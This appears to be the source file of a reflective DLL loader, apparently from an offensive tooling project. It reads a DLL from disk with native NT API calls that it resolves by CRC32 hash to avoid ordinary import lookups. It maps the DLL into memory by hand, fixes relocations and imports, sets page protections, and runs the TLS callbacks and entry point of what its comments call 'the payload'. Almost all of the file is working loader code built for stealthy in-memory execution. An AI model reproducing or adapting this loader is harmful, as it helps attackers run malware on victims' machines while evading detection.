#include "src/h/defs.h"
#include "src/h/peb.h"

void *mc(void *dest, const void *src, size_t n) {

  char *d = (char *)dest;
  const char *s = (const char *)src;
  while (n--)
    *d++ = *s++;
  return dest;
}

extern "C" {
void __main() {}

void *memset(void *s, int c, size_t n) {
  unsigned char *p = (unsigned char *)s;
  while (n--)
    *p++ = (unsigned char)c;
  return s;
}

size_t strlen(const char *s) {
  size_t len = 0;
  while (*s++)
    len++;
  return len;
}
}
extern "C" void entry() {

  //////////////////////////////////////////////////////////////////////////////
  //  Disk Staging & Buffer Ingestion
  /////////////////////////////////////////////////////////////////////////////
  NTSTATUS status;
  UNICODE_STRING dll_file;
  // WCHAR w_file_path[100] = L"main.dll";
  // WCHAR w_file_path[] = L"\\??\\C:\\windows\\temp\\test.txt";
  WCHAR w_file_path[] = L"\\??\\Z:\\home\\nabiasa\\Desktop\\Nyx\\rdi_srdi\\main.dll";
  // Resolve and invoke RtlInitUnicodeString
  void *p_ntdll = get_ntdll();
  void *p_rtl_init_unicode_string =
      get_proc_address_by_hash(p_ntdll, RtlInitUnicodeString_CRC32b);
  RtlInitUnicodeString *g_rtl_init_unicode_string =
      (RtlInitUnicodeString *)p_rtl_init_unicode_string;
  g_rtl_init_unicode_string(&dll_file, w_file_path);

  FILE_STANDARD_INFORMATION file_standard_info;
  OBJECT_ATTRIBUTES obj_attrs;
  IO_STATUS_BLOCK io_status_block;
  InitializeObjectAttributes(&obj_attrs, &dll_file, OBJ_CASE_INSENSITIVE, NULL,
                             NULL);
  // Resolve and invoke NtCreateFile
  HANDLE h_file = NULL;
  void *p_nt_create_file =
      get_proc_address_by_hash(p_ntdll, NtCreateFile_CRC32b);
  NtCreateFile *g_nt_create_file = (NtCreateFile *)p_nt_create_file;

  // Vérifie que g_nt_create_file est valide
  if (!g_nt_create_file) {
    // LoggInfo("g_nt_create_file is NULL!");
    EXIT(-1);
  }
  // LoggInfo("2 - g_nt_create_file is valid");

  // Appelle NtCreateFile
  status = g_nt_create_file(&h_file, SYNCHRONIZE | GENERIC_READ, &obj_attrs,
                            &io_status_block, NULL, 0x0000080, 0x0000007,
                            FILE_OPEN_IF, 0x0000020, 0x0000000, 0);

  // LoggInfo("3 - NtCreateFile called"); // ← Maintenant TOUJOURS atteint !
  if (status != 0) {
    char buf[128];
    char *p = buf;

    const char *prefix = "[ERROR ] NtCreateFile status = 0x";
    while (*prefix)
      *p++ = *prefix++;

    // Status en hex (8 digits)
    for (int i = 7; i >= 0; i--) {
      int nibble = (status >> (i * 4)) & 0xF;
      *p++ = (nibble < 10) ? ('0' + nibble) : ('A' + nibble - 10);
    }
    *p++ = '\n';
    *p = '\0';

    // LoggInfo(buf);
    EXIT(-1);
  }
  // LoggInfo("4 - NtCreateFile SUCCESS");

  // Resolve and invoke NtQueryInformationFile
  void *p_nt_query_information_file =
      get_proc_address_by_hash(p_ntdll, NtQueryInformationFile_CRC32b);
  NtQueryInformationFile *g_nt_query_information_file =
      (NtQueryInformationFile *)p_nt_query_information_file;
  if ((status = g_nt_query_information_file(h_file, &io_status_block,
                                            &file_standard_info,
                                            sizeof(FILE_STANDARD_INFORMATION),
                                            FileStandardInformation)) != 0x0) {
    EXIT(-2);
  }
  // Resolve and invoke NtAllocateVirtualMemory
  unsigned long long int dll_size = file_standard_info.EndOfFile.QuadPart;
  void *dll_bytes = NULL;
  void *p_nt_allocate_virtual_memory =
      get_proc_address_by_hash(p_ntdll, NtAllocateVirtualMemory_CRC32b);
  NtAllocateVirtualMemory *g_nt_allocate_virtual_memory =
      (NtAllocateVirtualMemory *)p_nt_allocate_virtual_memory;
  if ((status =
           g_nt_allocate_virtual_memory(((HANDLE)-1), &dll_bytes, 0, &dll_size,
                                        MEM_COMMIT, PAGE_READWRITE)) != 0x0)
    EXIT(-3);
  // Resolve and invoke NtReadFile
  void *p_nt_read_file = get_proc_address_by_hash(p_ntdll, NtReadFile_CRC32b);
  NtReadFile *g_nt_read_file = (NtReadFile *)p_nt_read_file;
  if ((status = g_nt_read_file(h_file, NULL, NULL, NULL, &io_status_block,
                               dll_bytes, dll_size, 0, NULL)) != 0x0)
    EXIT(-4);
  //////////////////////////////////////////////////////////////////////////////
  //  PE Header Parsing and Structural Validation
  /////////////////////////////////////////////////////////////////////////////
  PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)dll_bytes;
  PIMAGE_NT_HEADERS nt_headers =
      (PIMAGE_NT_HEADERS)((unsigned long long int)dll_bytes +
                          dos_header->e_lfanew);
  SIZE_T dll_image_size = nt_headers->OptionalHeader.SizeOfImage;

  //////////////////////////////////////////////////////////////////////////////
  //  Memory allocated in the address space
  /////////////////////////////////////////////////////////////////////////////
  // Allocate memory using NTAPI
  void *dll_base = NULL;
  if ((status = g_nt_allocate_virtual_memory(((HANDLE)-1), &dll_base, 0,
                                             &dll_image_size, MEM_COMMIT,
                                             PAGE_READWRITE)) != 0x0)
    EXIT(-4);

  // Calculate relocation delta
  unsigned long long int delta_image_base =
      (unsigned long long int)dll_base -
      (unsigned long long int)nt_headers->OptionalHeader.ImageBase;
  // Map PE Headers
  mc(dll_base, dll_bytes, nt_headers->OptionalHeader.SizeOfHeaders);
  // Map Sections
  PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt_headers);
  for (size_t i = 0; i < nt_headers->FileHeader.NumberOfSections; i++) {

    void *section_destination =
        (LPVOID)((unsigned long long int)dll_base +
                 (unsigned long long int)section->VirtualAddress);
    void *section_bytes =
        (LPVOID)((unsigned long long int)dll_bytes +
                 (unsigned long long int)section->PointerToRawData);
    // ... [Custom memory copy implementation]
    mc(section_destination, section_bytes, section->SizeOfRawData);
    section++;
  }
  //////////////////////////////////////////////////////////////////////////////
  //  relocations
  /////////////////////////////////////////////////////////////////////////////
  _IMAGE_DATA_DIRECTORY relocations =
      nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
  unsigned long long int relocation_table =
      relocations.VirtualAddress + (unsigned long long int)dll_base;
  unsigned long relocations_processed = 0;

  while (relocations_processed < relocations.Size) {
    PBASE_RELOCATION_BLOCK relocation_block =
        (PBASE_RELOCATION_BLOCK)(relocation_table + relocations_processed);
    relocations_processed += sizeof(BASE_RELOCATION_BLOCK);
    unsigned long relocations_count =
        (relocation_block->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) /
        sizeof(BASE_RELOCATION_ENTRY);
    PBASE_RELOCATION_ENTRY relocation_entries =
        (PBASE_RELOCATION_ENTRY)(relocation_table + relocations_processed);

    for (unsigned long i = 0; i < relocations_count; i++) {
      relocations_processed += sizeof(BASE_RELOCATION_ENTRY);
      if (relocation_entries[i].Type == 0)
        continue;

      unsigned long long int relocation_rva =
          relocation_block->PageAddress + relocation_entries[i].Offset;
      unsigned long long int address_to_patch = 0;
      void *p_nt_read_virtual_memory =
          get_proc_address_by_hash(p_ntdll, NtReadVirtualMemory_CRC32b);
      // Resolve NtReadVirtualMemory
      NtReadVirtualMemory *g_nt_read_virtual_memory =
          (NtReadVirtualMemory *)p_nt_read_virtual_memory;
      // Read the value to patch via NTAPI instead of direct dereference
      if ((status = g_nt_read_virtual_memory(
               ((HANDLE)-1),
               (void *)((unsigned long long int)dll_base + relocation_rva),
               &address_to_patch, sizeof(unsigned long long int), NULL)) != 0x0)
        EXIT(-5);
      // Apply delta to local variable
      address_to_patch += delta_image_base;
      mc((void *)((unsigned long long int)dll_base + relocation_rva),
         &address_to_patch, sizeof(unsigned long long int));
    }
  }
  //////////////////////////////////////////////////////////////////////////////
  //  IAT Resolution via NTAPIs
  /////////////////////////////////////////////////////////////////////////////
  PIMAGE_IMPORT_DESCRIPTOR import_descriptor;
  IMAGE_DATA_DIRECTORY images_directory =
      nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
  UNICODE_STRING import_library_name;

  import_descriptor =
      (PIMAGE_IMPORT_DESCRIPTOR)(images_directory.VirtualAddress +
                                 (unsigned long long int)dll_base);
  void *current_library = NULL;

  // Iterate through all DLL dependencies in the Import Directory
  while (import_descriptor->Name != 0) {
    void *p_ldr_load_dll = get_proc_address_by_hash(p_ntdll, LdrLoadDll_CRC32b);
    char *module_name = (char *)dll_base + import_descriptor->Name;
    wchar_t w_module_name[MAX_PATH];
    unsigned long num_converted;

    // Convert ANSI to Unicode using NTAPI
    void *p_rtl_multi_byte_to_unicode_n =
        get_proc_address_by_hash(p_ntdll, RtlMultiByteToUnicodeN_CRC32b);
    RtlMultiByteToUnicodeN *g_rtl_multi_byte_to_unicode_n =
        (RtlMultiByteToUnicodeN *)p_rtl_multi_byte_to_unicode_n;
    //  strlen to avoid CRT imports
    if ((status = g_rtl_multi_byte_to_unicode_n(
             w_module_name, sizeof(w_module_name), &num_converted, module_name,
             strlen(module_name) + 1)) != 0x0)
      EXIT(-5);
    // Load the DLL via NTAPI
    g_rtl_init_unicode_string(&import_library_name, w_module_name);
    LdrLoadDll *g_ldr_load_dll = (LdrLoadDll *)p_ldr_load_dll;
    if ((status = g_ldr_load_dll(NULL, NULL, &import_library_name,
                                 &current_library)) != 0x0)
      EXIT(-6);

    if (current_library) {
      ANSI_STRING a_string;
      PIMAGE_THUNK_DATA thunk = NULL;
      PIMAGE_THUNK_DATA original_thunk = NULL;
      thunk = (PIMAGE_THUNK_DATA)((unsigned long long int)dll_base +
                                  import_descriptor->FirstThunk);
      original_thunk =
          (PIMAGE_THUNK_DATA)((unsigned long long int)dll_base +
                              import_descriptor->OriginalFirstThunk);
      // Resolve individual functions
      while (thunk->u1.AddressOfData != 0) {
        void *p_ldr_get_procedure_address =
            get_proc_address_by_hash(p_ntdll, LdrGetProcedureAddress_CRC32b);
        LdrGetProcedureAddress *g_ldr_get_procedure_address =
            (LdrGetProcedureAddress *)p_ldr_get_procedure_address;
        if (IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal)) {
          g_ldr_get_procedure_address(current_library, NULL,
                                      (WORD)original_thunk->u1.Ordinal,
                                      (PVOID *)&(thunk->u1.Function));
        } else {
          PIMAGE_IMPORT_BY_NAME functionName =
              (PIMAGE_IMPORT_BY_NAME)((unsigned long long int)dll_base +
                                      thunk->u1.AddressOfData);
          FILL_STRING(a_string, functionName->Name);
          g_ldr_get_procedure_address(current_library, &a_string, 0,
                                      (PVOID *)&(thunk->u1.Function));
        }
        ++thunk;
        ++original_thunk;
      }
    }
    import_descriptor++;
  }
  ////////////////////////////////////////////////////////////////////
  ///  iterates through the sections of a DLL, as defined in its PE file header.
  ///  For each section  >> calls the NtProtectVirtualMemory() function,
  ///  obtained through a function pointer, to set the appropriate memory
  ///  protection for the section.
  ///////////////////////////////////////////////////////////////////
  PIMAGE_SECTION_HEADER section_header = IMAGE_FIRST_SECTION(nt_headers);

  for (int i = 0; i < nt_headers->FileHeader.NumberOfSections;
       i++, section_header++) {
    if (section_header->SizeOfRawData) {
      // Extract Boolean flags from section characteristics
      unsigned long executable =
          (section_header->Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
      unsigned long readable =
          (section_header->Characteristics & IMAGE_SCN_MEM_READ) != 0;
      unsigned long writeable =
          (section_header->Characteristics & IMAGE_SCN_MEM_WRITE) != 0;
      unsigned long protect = 0;
      // Translate 3-bit PE flags to NTAPI memory protection constants
      if (!executable && !readable && !writeable)
        protect = PAGE_NOACCESS;
      else if (!executable && !readable && writeable)
        protect = PAGE_WRITECOPY;
      else if (!executable && readable && !writeable)
        protect = PAGE_READONLY;
      else if (!executable && readable && writeable)
        protect = PAGE_READWRITE;
      else if (executable && !readable && !writeable)
        protect = PAGE_EXECUTE;
      else if (executable && !readable && writeable)
        protect = PAGE_EXECUTE_WRITECOPY;
      else if (executable && readable && !writeable)
        protect = PAGE_EXECUTE_READ;
      else if (executable && readable && writeable)
        protect = PAGE_EXECUTE_READWRITE;
      // Handle optional PE cache flags
      if (section_header->Characteristics & IMAGE_SCN_MEM_NOT_CACHED)
        protect |= PAGE_NOCACHE;
      // Resolve and invoke NtProtectVirtualMemory
      void *p_nt_protect_virtual_memory =
          get_proc_address_by_hash(p_ntdll, NtProtectVirtualMemory_CRC32b);
      NtProtectVirtualMemory *g_nt_protect_virtual_memory =
          (NtProtectVirtualMemory *)p_nt_protect_virtual_memory;
      size_t size = section_header->Misc.VirtualSize;
      void *address =
          reinterpret_cast<PBYTE>(dll_base) + section_header->VirtualAddress;

      unsigned long old_protect = 0;
      // NtProtectVirtualMemory updates 'address' and 'size' to reflect
      // page-aligned boundaries
      if ((status =
               g_nt_protect_virtual_memory(NtCurrentProcess(), &address, &size,
                                           protect, &old_protect)) != 0x0)
        EXIT(-7);
    }
  }
  ////////////////////////////////////////////////////////////////////
  /// NtFlushInstructionCache` after processing the IAT. Next, the code checks
  /// if the PE file has a TLS (Thread Local Storage) directory entry in its
  /// optional header, using the `IMAGE_DIRECTORY_ENTRY_TLS` constant
  ///////////////////////////////////////////////////////////////////
  void *p_nt_flush_instruction_cache =
      get_proc_address_by_hash(p_ntdll, NtFlushInstructionCache_CRC32b);
  NtFlushInstructionCache *g_nt_flush_instruction_cache =
      (NtFlushInstructionCache *)p_nt_flush_instruction_cache;
  g_nt_flush_instruction_cache((HANDLE)-1, NULL, 0);

  PIMAGE_TLS_CALLBACK *callback;
  PIMAGE_DATA_DIRECTORY tls_entry =
      &nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
  if (tls_entry->Size) {
    PIMAGE_TLS_DIRECTORY tls_dir =
        (PIMAGE_TLS_DIRECTORY)((unsigned long long int)dll_base +
                               tls_entry->VirtualAddress);
    callback = (PIMAGE_TLS_CALLBACK *)(tls_dir->AddressOfCallBacks);
    for (; *callback; callback++)
      (*callback)((LPVOID)dll_base, DLL_PROCESS_ATTACH, NULL);
  }
  ////////////////////////////////////////////////////////////////////
  /// Resolve Entry Point
  ///////////////////////////////////////////////////////////////////
  DLLEntry DllEntry =
      (DLLEntry)((unsigned long long int)dll_base +
                 nt_headers->OptionalHeader.AddressOfEntryPoint);

  // Transfer execution to the payload
  (*DllEntry)((HINSTANCE)dll_base, DLL_PROCESS_ATTACH, 0);

  // Post-execution cleanup (Reached only if DllMain returns)
  void *p_nt_close = get_proc_address_by_hash(p_ntdll, NtClose_CRC32b);
  NtClose *g_nt_close = (NtClose *)p_nt_close;
  g_nt_close(h_file);

  // Eradicate the raw staging buffer
  void *p_nt_free_virtual_memory =
      get_proc_address_by_hash(p_ntdll, NtFreeVirtualMemory_CRC32b);
  NtFreeVirtualMemory *g_nt_free_virtual_memory =
      (NtFreeVirtualMemory *)p_nt_free_virtual_memory;
  g_nt_free_virtual_memory(((HANDLE)-1), &dll_bytes, &dll_size, MEM_RELEASE);
  EXIT(-1);
}
